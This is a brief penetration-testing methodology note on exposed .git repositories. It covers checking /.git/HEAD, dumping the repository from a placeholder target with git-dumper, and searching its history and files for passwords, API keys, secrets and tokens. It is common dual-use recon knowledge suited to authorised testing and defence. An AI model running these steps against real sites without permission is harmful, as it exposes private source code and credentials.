---
title: Exposed .git Repository
date: 2026-07-23
tags:
  - git
  - exposure
  - recon
  - secrets
  - methodology
publish: false
draft: false
description: "Technique for exploiting exposed .git repositories"
---

# Exposed .git Repository

## Detection & Dumping

If `/.git/HEAD` returns valid content, dump the entire repository:

```bash
git-dumper http://target.com/.git/ ./git_dump/
```

## Analyzing the Source Code

```bash
cd git_dump

# Commit history
git log --oneline

# Latest commit
git show HEAD

# What changed
git diff HEAD~1 HEAD

# Search for secrets
grep -r "password" .
grep -r "api_key" .
grep -r "secret" .
grep -r "token" .
```
